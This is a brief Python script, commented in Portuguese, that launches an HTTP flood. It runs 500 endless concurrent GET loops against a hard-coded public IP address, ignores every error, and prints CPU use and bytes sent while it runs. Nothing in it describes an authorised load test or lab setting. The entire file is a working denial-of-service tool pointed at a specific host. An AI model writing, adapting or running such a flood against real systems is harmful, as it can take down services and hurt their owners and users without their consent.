#!/usr/bin/env python3
import asyncio, aiohttp, psutil, time, os

TARGET = "http://34.151.221.105/"
CONCURRENT = 500                 # requisições simultâneas
REPORT_EVERY = 5                 # segundos

async def flood(session):
    while True:
        try:
            async with session.get(TARGET, timeout=5) as r:
                pass
        except:
            pass

async def monitor():
    while True:
        cpu = psutil.cpu_percent(interval=1)
        net = psutil.net_io_counters()
        print(f"[+] CPU:{cpu:5.1f}% | TX:{net.bytes_sent//1024:8} KB")
        await asyncio.sleep(REPORT_EVERY)

async def main():
    asyncio.create_task(monitor())
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*(flood(session) for _ in range(CONCURRENT)))

if __name__ == "__main__":
    asyncio.run(main())
